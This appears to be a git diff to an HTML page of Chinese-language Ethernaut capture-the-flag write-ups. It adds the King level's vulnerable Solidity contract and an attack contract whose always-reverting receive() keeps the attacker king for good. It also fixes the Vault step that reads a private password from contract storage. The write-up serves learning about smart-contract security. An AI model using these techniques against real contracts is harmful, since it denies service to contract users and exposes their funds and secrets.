@@ -246,14 +246,65 @@ contract Vault {
                <a href="https://blog.csdn.net/rfrder/article/details/115706983">----------相关文章-----------</a>
                <p>对于本题目:</p>
                <p>locked占1byte，在solt 0 的位置，password占32byte，在solt 1 的位置</p>
-               <p>第一步调用   await web.eth.getStorageAt(contract.address,1)  获取byte32 password</p>
+               <p>第一步调用   await web3.eth.getStorageAt(contract.address,1)  获取byte32 password</p>
                <p>得到password后，第二步调用    contract.unlock(   )   括号中为得到的password</p>
                <p>可以调用  await contract.locked()来查看是否解锁成功，结束游戏</p>
             <br><br><br><br>
             <h3>10.king</h3>
             <p>题目如下</p>
             <pre><code>
-                
+                下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.
+
+这么有趣的游戏, 你的目标是攻破他.
+
+当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+
+  address king;
+  uint public prize;
+  address public owner;
+
+  constructor() payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    payable(king).transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address) {
+    return king;
+  }
+}
+            </code></pre>
+            <p>观察合约可知：</p>
+            <p>合约的receive函数中当一个人发送了比当前合约prize大的金额，就会取代当前的king。只要在成为king后不接受转账就可以一直是king</p>
+            <p>编写如下攻击合约</p>
+            <pre><code>
+                // SPDX-License-Identifier: MIT
+pragma solidity ^ 0.8.0;
+contract attackking{
+    constructor() public payable {}
+    
+
+    function attack(address payable addr) public payable{
+        addr.call{value:0.002 ether,gas:1000000}("");
+    }
+
+        receive() external payable{
+            revert();
+        }
+    }
+    <p>创建合约时传入一些ether，填入目标地址调用即可</p>
             </code></pre>
 			<br>
 			<br>
